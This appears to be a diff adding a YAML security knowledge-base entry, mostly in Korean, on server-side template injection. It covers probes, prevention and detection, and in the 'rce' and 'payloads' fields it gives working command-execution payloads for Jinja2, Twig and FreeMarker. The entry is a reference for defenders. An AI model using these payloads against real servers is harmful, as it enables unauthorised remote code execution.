@@ -1,0 +1,111 @@
+# GR Atom: Server-Side Template Injection (SSTI)
+# Version: 1.0
+# Created: 2025-01-29
+
+identity:
+  id: "ATK-WEB-SSTI-001"
+  name: "Server-Side Template Injection (SSTI)"
+  normalization:
+    normalized_name: "ssti server side template injection jinja2 freemarker"
+    normalization_version: "1.0"
+  aliases:
+    - "서버 사이드 템플릿 인젝션"
+    - "SSTI"
+    - "템플릿 인젝션"
+
+classification:
+  domain: security
+  type: attack
+  abstraction_level: 2
+  gr_coordinates:
+    layer: "L5"
+    zone: "Zone1"
+    tags: ["ATK", "WEB", "INJECTION"]
+
+definition:
+  what: |
+    SSTI는 서버 사이드 템플릿 엔진에 악성 코드를 주입하여
+    원격 코드 실행(RCE)을 달성하는 공격이다.
+  why: |
+    많은 웹 프레임워크가 템플릿 엔진을 사용한다.
+    사용자 입력이 템플릿에 직접 삽입되면 RCE로 이어진다.
+  how: |
+    1. 템플릿 엔진 식별 (에러 메시지, 프로브)
+    2. 템플릿 구문 테스트 ({{7*7}})
+    3. 샌드박스 우회 가젯 찾기
+    4. 시스템 명령 실행
+
+relations:
+  structural:
+    is_a:
+      - "ATK-INJECT-CMD-001"
+    related_to:
+      - "ATK-SERVER-RFI-001"
+
+properties:
+  technical:
+    vulnerable_engines:
+      - name: "Jinja2 (Python)"
+        probe: "{{7*7}}"
+        rce: "{{''.__class__.__mro__[2].__subclasses__()}}"
+      - name: "Twig (PHP)"
+        probe: "{{7*7}}"
+        rce: "{{_self.env.registerUndefinedFilterCallback('exec')}}"
+      - name: "FreeMarker (Java)"
+        probe: "${7*7}"
+        rce: "<#assign ex='freemarker.template.utility.Execute'?new()>"
+      - name: "Velocity (Java)"
+        probe: "#set($x=7*7)$x"
+      - name: "Pebble (Java)"
+        probe: "{{7*7}}"
+      - name: "ERB (Ruby)"
+        probe: "<%= 7*7 %>"
+    identification:
+      - "에러 메시지에서 템플릿 엔진 확인"
+      - "여러 템플릿 구문 시도"
+      - "산술 연산 반영 확인"
+    payloads:
+      jinja2: |
+        {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+      twig: |
+        {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+    prevention:
+      - "사용자 입력을 템플릿에 직접 삽입 금지"
+      - "샌드박스 활성화"
+      - "로직 없는 템플릿 사용"
+      - "입력 검증/이스케이프"
+    detection:
+      - "WAF 규칙"
+      - "템플릿 구문 패턴 탐지"
+      - "프로세스 실행 모니터링"
+
+metadata:
+  trust:
+    source: official
+    references:
+      - "PortSwigger SSTI Research"
+      - "OWASP SSTI"
+    confidence: 1.0
+    verified:
+      status: verified
+      date: 2025-01-29
+      by: "GR System"
+  temporal:
+    created: 2025-01-29
+    modified: 2025-01-29
+    revision: 1
+  security:
+    sensitivity: public
+  ai:
+    embedding_text: |
+      SSTI는 템플릿 엔진에 코드를 주입하여 RCE를 달성하는 공격이다. Jinja2, Twig,
+      FreeMarker가 주요 대상이며 입력 분리, 샌드박스로 방어한다.
+    search_keywords:
+      - "SSTI"
+      - "템플릿 인젝션"
+      - "Jinja2"
+      - "RCE"
+    related_queries:
+      - "SSTI 공격"
+      - "템플릿 보안"
+      - "Jinja2 보안"
